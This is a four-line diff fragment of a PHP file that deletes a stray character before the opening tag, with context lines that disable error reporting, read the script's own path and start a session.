@@ -1,4 +1,4 @@
-A<?php
+<?php
 error_reporting(0);
 $slf = $_SERVER['PHP_SELF'];
 @session_start();
